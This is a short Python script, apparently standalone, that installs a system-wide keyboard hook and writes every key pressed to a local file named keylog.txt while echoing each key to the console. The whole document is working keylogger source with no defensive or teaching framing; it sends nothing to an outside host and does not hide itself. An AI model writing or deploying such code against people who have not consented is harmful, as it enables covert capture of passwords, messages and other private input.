import keyboard
import time

# Create a log file
log_file = "keylog.txt"

def log_key_press(event):
    # Get the key pressed
    key = event.name

    # Write the key to the log file
    with open(log_file, "a") as f:
        f.write(f"{key}\n")

    # Print the key to the console for debugging purposes
    print(f"Key pressed: {key}")

# Set up the keyboard hook
keyboard.on_press(log_key_press)

# Keep the program running indefinitely
while True:
    time.sleep(0.1)